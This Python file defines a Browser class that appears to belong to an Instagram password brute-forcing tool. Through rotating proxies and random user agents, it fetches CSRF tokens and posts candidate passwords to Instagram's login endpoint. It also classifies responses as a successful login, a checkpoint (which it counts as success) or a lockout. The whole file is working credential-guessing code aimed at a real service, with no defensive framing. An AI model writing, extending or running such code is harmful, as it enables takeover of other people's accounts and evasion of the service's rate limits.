# Date: 12/28/2018
# Author: Mohamed
# Description: Browser

from time import time
from requests import Session
from datetime import datetime
from random import choice, randint
from .const import browser_data, response_codes, fetch_time, user_agents, debug


class Browser(object):

    account_exists = None

    def __init__(self, username, password, proxy):
        self.proxy = proxy
        self.is_found = False
        self.is_active = True
        self.is_locked = False
        self.start_time = None
        self.browser = self.br()
        self.username = username
        self.password = password
        self.is_attempted = False

    def br(self):
        header = browser_data['header']
        header['user-agent'] = choice(user_agents)

        session = Session()
        session.headers.update(header)
        session.proxies.update(self.proxy.addr)
        return session

    def get_token(self):
        try:
            return self.browser.get(
                browser_data['home_url'], timeout=fetch_time).cookies.get_dict()['csrftoken']
        except:
            pass

    def post_data(self):
        enc_password = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(
            int(datetime.now().timestamp()), self.password)

        data = {
            browser_data['username_field']: self.username,
            browser_data['password_field']: enc_password
        }

        try:
            return self.browser.post(
                browser_data['login_url'],
                data=data,
                timeout=fetch_time
            ).json()
        except:
            pass

    def check_exists(self, response):
        if 'user' in response:
            Browser.account_exists = response['user']

    def check_response(self, response):
        if 'authenticated' in response:
            if response['authenticated']:
                return response_codes['succeed']

        if 'message' in response:
            if response['message'] == 'checkpoint_required':
                return response_codes['succeed']

            if response['status'] == 'fail':
                return response_codes['locked']

        if 'errors' in response:
            return response_codes['locked']

        return response_codes['failed']

    def authenicate(self):
        response = self.post_data()
        resp = {'attempted': False, 'accessed': False, 'locked': False}

        if debug:
            print('pass: {} => {}'.format(self.password, response))

        if response:
            resp['attempted'] = True
            resp_code = self.check_response(response)

            if resp_code == response_codes['locked']:
                resp['locked'] = True

            if resp_code == response_codes['succeed']:
                resp['accessed'] = True

            if Browser.account_exists == None:
                self.check_exists(response)

        return resp

    def attempt(self):
        self.start_time = time()
        token = self.get_token()

        if token:
            self.browser.headers.update({'x-csrftoken': token})
            resp = self.authenicate()

            if resp['attempted']:
                self.is_attempted = True

                if not resp['locked']:
                    if resp['accessed']:
                        self.is_found = True
                else:
                    self.is_locked = True
        self.close()

    def close(self):
        self.browser.close()
        self.is_active = False
